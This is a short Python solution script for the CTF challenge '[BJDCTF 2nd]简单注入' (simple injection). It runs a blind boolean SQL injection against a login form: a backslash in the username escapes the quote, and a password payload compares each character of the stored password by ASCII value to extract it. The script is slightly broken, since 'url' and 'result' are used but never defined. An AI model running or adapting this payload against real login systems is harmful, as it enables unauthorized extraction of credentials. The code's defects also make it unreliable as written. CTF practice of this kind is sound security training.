[BJDCTF 2nd]简单注入

import requests
import time

for k in range(1,20):
    for i in range(65,126):
        payload = {"username":"\\",'password':'or (ascii(substr(password,'+str(k)+',1))>'+str(i)+')#'}
        req = requests.post(url=url,data=payload)
        time.sleep(0.5)
        if "P3" in req.text:
            print(chr(i))

            print(result)
            break
print(result)
